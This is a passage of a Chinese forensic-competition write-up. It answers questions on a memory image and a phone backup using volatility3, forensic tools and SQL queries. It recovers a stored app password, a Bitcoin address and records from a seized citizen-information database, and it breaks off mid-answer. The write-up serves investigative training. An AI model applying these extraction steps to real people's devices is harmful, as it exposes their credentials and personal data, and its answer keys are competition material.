&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;24嫌疑人和洗钱人员约定电子钱包的金额比例是什么&#34;&gt;24.嫌疑人和洗钱人员约定电子钱包的金额比例是什么
&lt;/h2&gt;&lt;p&gt;同上题图：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0.2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材三计算机内存镜像&#34;&gt;检材三(计算机内存镜像)
&lt;/h1&gt;&lt;h2 id=&#34;25检材三中进程ftk-imagerexe的-pid-是多少&#34;&gt;25.检材三中进程&amp;quot;FTK Imager.exe&amp;quot;的 PID 是多少
&lt;/h2&gt;&lt;p&gt;不知道为什么我的volatility2不能分析出win10的结果，只好使用volatility3：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.pslist.PsList | grep FTK
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709195208579&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709195208579.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195208579.png&#34; alt=&#34;image-20250709195208579&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;11328
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;26检材三中显示的系统时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;26.检材三中显示的系统时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.info.Info  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709211018795&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709211018795.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709211018795.png&#34; alt=&#34;image-20250709211018795&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2023-12-12 04:06:25
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;27检材三中记录的当前系统ip是多少&#34;&gt;27.检材三中记录的当前系统ip是多少?
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.netscan.NetScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709200824096&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709200824096.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200824096.png&#34; alt=&#34;image-20250709200824096&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;172.18.7.229
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材四-红米手机备份数据&#34;&gt;检材四 (红米手机备份数据)
&lt;/h1&gt;&lt;h2 id=&#34;28检材四中迅雷下载过的文件名是什么&#34;&gt;28.检材四中迅雷下载过的文件名是什么?
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 迅雷 -&amp;gt; 云盘 -&amp;gt; 离线下载目录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709193648459&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709193648459.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193648459.png&#34; alt=&#34;image-20250709193648459&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;《向银河靠近》.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;29检材四中安装了哪些可是实现翻墙vpn功能的-app&#34;&gt;29.检材四中安装了哪些可是实现翻墙(VPN)功能的 app?
&lt;/h2&gt;&lt;p&gt;没啥说的：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709193825301&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709193825301.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193825301.png&#34; alt=&#34;image-20250709193825301&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;30检材四备份的设备系统版本是多少&#34;&gt;30.检材四备份的设备系统版本是多少?
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息-&amp;gt; 设备信息 -&amp;gt; 厂商版本：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709193935053&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709193935053.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193935053.png&#34; alt=&#34;image-20250709193935053&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; V14.0.2.0.TKSCNXM
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;31检材四备份的时间是多少答案以-13-位时间戳表示&#34;&gt;31.检材四备份的时间是多少(答案以 13 位时间戳表示)
&lt;/h2&gt;&lt;p&gt;同上题图，转换时间戳（2023-12-13 17:20:32）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1702459232429
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;32检材四中-filecompress-app-包名是什么&#34;&gt;32.检材四中 FileCompress app 包名是什么?
&lt;/h2&gt;&lt;p&gt;包名就在检材里面列出，复制黏贴就行：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709195000907&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709195000907.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195000907.png&#34; alt=&#34;image-20250709195000907&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;com.zs.filecompress
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;33检材四中备忘录记录的内容是什么&#34;&gt;33.检材四中备忘录记录的内容是什么?
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息-&amp;gt; 便签：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709194341673&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709194341673.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709194341673.png&#34; alt=&#34;image-20250709194341673&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vcpswd:edgewallet
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;34请列出检材四中所有虚拟币钱包-app-的包名-如有多个用顿号分隔&#34;&gt;34.请列出检材四中所有虚拟币钱包 app 的包名, 如有多个用顿号分隔
&lt;/h2&gt;&lt;p&gt;直接搜索检材里的app，一共六个：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709195051880&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709195051880.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195051880.png&#34; alt=&#34;image-20250709195051880&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;35检材四中嫌疑人使用-bitcoin-wallet-钱包地址是什么&#34;&gt;35.检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么?
&lt;/h2&gt;&lt;p&gt;在下面路径中找到并导出日志文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bitcoin Wallet(de.schildbach.wallet).bak/apps/de.schildbach.wallet/f/log/wallet.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709200125980&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709200125980.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200125980.png&#34; alt=&#34;image-20250709200125980&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;搜索&lt;code&gt;walletaddress&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709200547089&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709200547089.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200547089.png&#34; alt=&#34;image-20250709200547089&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;36md5-值为ff3dabd0a610230c2486bffbe15e5dff的文件在检材四中的位置&#34;&gt;36.MD5 值为&amp;quot;FF3DABD0A610230C2486BFFBE15E5DFF&amp;quot;的文件在检材四中的位置
&lt;/h2&gt;&lt;p&gt;这一题据说是结合前面提到的FileCompress一路找下去就能发现，不过太电波了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709202128966&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709202128966.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202128966.png&#34; alt=&#34;image-20250709202128966&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里更好的办法是用HashMyFiles，全部算一遍再搜索&lt;/p&gt;
&lt;p&gt;然而我不知道怎么使用这个工具，好在火眼有类似的功能&lt;/p&gt;
&lt;p&gt;文件 -&amp;gt; 检材四 -&amp;gt; 文件系统 -&amp;gt; 勾选所有文件 -&amp;gt; 右键新建哈希集 -&amp;gt; 勾选项：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250710124643356&#34; href=&#34;http://picture.928330.xyz/typora/image-20250710124643356.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710124643356.png&#34; alt=&#34;image-20250710124643356&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;创建的新建哈希集任务完成后，选择高级，在文件哈希处输入MD5，过滤范围选择子目录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250710124613331&#34; href=&#34;http://picture.928330.xyz/typora/image-20250710124613331.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710124613331.png&#34; alt=&#34;image-20250710124613331&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;成功找到目标文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250710125044835&#34; href=&#34;http://picture.928330.xyz/typora/image-20250710125044835.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710125044835.png&#34; alt=&#34;image-20250710125044835&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;20231213_172032.tar/FileCompress(com.zs.filecompress).bak/FileCompress/11月.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;综合题目&#34;&gt;综合题目
&lt;/h1&gt;&lt;h2 id=&#34;37检材中受害人的微信号是多少&#34;&gt;37.检材中受害人的微信号是多少?
&lt;/h2&gt;&lt;p&gt;检材二 -&amp;gt; 微信 -&amp;gt; 好友消息，根据聊天记录能判断出受害者就是小浩：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709202302479&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709202302479.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202302479.png&#34; alt=&#34;image-20250709202302479&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B-I-N-A-R-Y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;38嫌疑人曾通过微信购买过一个公民信息数据库-该数据库中手机尾号是-8686-的用户的姓名是&#34;&gt;38.嫌疑人曾通过微信购买过一个公民信息数据库, 该数据库中手机尾号是 8686 的用户的姓名是
&lt;/h2&gt;&lt;p&gt;从另一个微信好友里面能发现购买数据库的名称为database.sqlite：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709202654797&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709202654797.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202654797.png&#34; alt=&#34;image-20250709202654797&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这个数据库手机看不了，在电脑里能看：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709202742412&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709202742412.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202742412.png&#34; alt=&#34;image-20250709202742412&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;链接数据库后查找：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;phone&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%8686&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250710130255431&#34; href=&#34;http://picture.928330.xyz/typora/image-20250710130255431.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710130255431.png&#34; alt=&#34;image-20250710130255431&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;章敏
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;39嫌疑人手机中是否保存了小西米语音-app-的账号密码-如有-请写出其密码&#34;&gt;39.嫌疑人手机中是否保存了小西米语音 app 的账号密码, 如有, 请写出其密码
&lt;/h2&gt;&lt;p&gt;加密iOS备份 -&amp;gt; 钥匙串 -&amp;gt; 网站与应用密码，我们已经知道小西米的包名&lt;code&gt;com.titashow.tangliao&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709203150613&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709203150613.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709203150613.png&#34; alt=&#34;image-20250709203150613&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; jamvU1@wiwgug$bo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;40公民信息数据库中-截止到-2023-年-12-月-31-日-年龄大于等于-18-且小于等于-30-岁之间的用户信息数量&#34;&gt;40.公民信息数据库中, 截止到 2023 年 12 月 31 日, 年龄大于等于 18 且小于等于 30 岁之间的用户信息数量
&lt;/h2&gt;&lt;p&gt;在38题中得到的database数据库里进行查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;20231231&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;substr&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;IDCARD&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#c678dd&#34;&gt;between&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;180000&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;300000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250712112610915&#34; href=&#34;http://picture.928330.xyz/typora/image-20250712112610915.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712112610915.png&#34; alt=&#34;image-20250712112610915&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1572
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;41受害人小浩的手机号码是多少&#34;&gt;41.受害人小浩的手机号码是多少
&lt;/h2&gt;&lt;p&gt;在上面的数据库中没有找到叫小浩的人，微信和短信也没有小浩的联系方式&lt;/p&gt;
&lt;p&gt;结果是之前找到的11月.txt是受害者名单，怎么发现的呢？&lt;/p&gt;
&lt;p&gt;案件 -&amp;gt; 快速分析 -&amp;gt; 耗时任务 -&amp;gt; 特征分析：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250712105749212&#34; href=&#34;http://picture.928330.xyz/typora/image-20250712105749212.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712105749212.png&#34; alt=&#34;image-20250712105749212&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;分析任务完成后，在文件 -&amp;gt; 检材 -&amp;gt; 加密文件中找到TrueCrypt容器&lt;/p&gt;
&lt;p&gt;在检材1的20231212.E01/分区6/Users/rd/Documents下有一个新建文本文档.txt是加密容器，有88MB：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250712105717926&#34; href=&#34;http://picture.928330.xyz/typora/image-20250712105717926.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712105717926.png&#34; alt=&#34;image-20250712105717926&#34;  /&gt;
&lt;/a&gt;
